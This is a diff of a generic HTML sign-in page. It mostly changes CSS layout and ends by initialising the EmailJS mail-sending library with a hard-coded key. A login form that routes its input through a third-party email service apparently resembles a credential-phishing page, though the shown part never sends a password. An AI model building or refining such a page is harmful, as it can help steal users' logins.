@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Sign In</title>
 <style>
-  body, html {
+  html, body {
     height: 100%;
     margin: 0;
     font-family: "Helvetica Neue", Helvetica, Arial, "Liberation Sans", sans-serif;
@@ -18,7 +18,7 @@
   body::before {
     content: "";
     position: fixed;
-    top: 0; left: 0;
+    top:0; left:0;
     width: 100%; height: 100%;
     background-color: #0088c1;
     opacity: 0.5;
@@ -26,27 +26,25 @@
     z-index: 0;
   }
   .outer-wrapper {
-    background-color: rgba(255, 255, 255, 0.95);
+    position: relative;
+    z-index: 1;
+    height: 100vh;
     display: flex;
     justify-content: center;
     align-items: center;
-    min-height: 100vh;
-    padding: 40px; /* full padding around form */
+    padding: 20px;
     box-sizing: border-box;
-    position: relative;
-    z-index: 1;
   }
   .form-container {
     width: 100%;
     max-width: 400px;
-    background-color: #ffffff;
-    border: 0;
+    background-color: rgba(255, 255, 255, 0.95);
+    padding: 40px 30px;
     box-sizing: border-box;
-    padding: 40px 30px; /* increased padding for full spacing */
+    border-radius: 8px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
     display: flex;
     flex-direction: column;
-    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-    border-radius: 8px;
   }
   .form-logo {
     width: 180px;
@@ -78,15 +76,12 @@
   }
   .custom-input {
     font-size: 15px;
-    font-weight: normal;
-    line-height: 1;
     border-radius: 4px;
     padding: 12px 20px !important;
     background: #ffffff;
     border: 1px solid #000000;
     box-sizing: border-box;
     width: 100%;
-    max-width: 370px;
     appearance: none;
     text-shadow: none;
     margin: 0;
@@ -100,20 +95,16 @@
     display: flex;
     flex-direction: column;
     width: 100%;
-    max-width: 370px;
   }
   .actions-row {
     display: flex;
     justify-content: space-between;
     align-items: center;
-    max-width: 370px;
-    width: 100%;
     margin-top: 15px;
   }
   .checkbox-container {
     display: flex;
     align-items: center;
-    margin-right: 5px;
   }
   .checkbox-container input[type="checkbox"] {
     width: 16px;
@@ -183,7 +174,7 @@
 <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
 <script>
   (function(){
-    emailjs.init('uGRhkufMjo08rjwb_'); // Your EmailJS User ID or Public Key
+    emailjs.init('uGRhkufMjo08rjwb_');
   })();
   function validateEmail(email) {
     const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
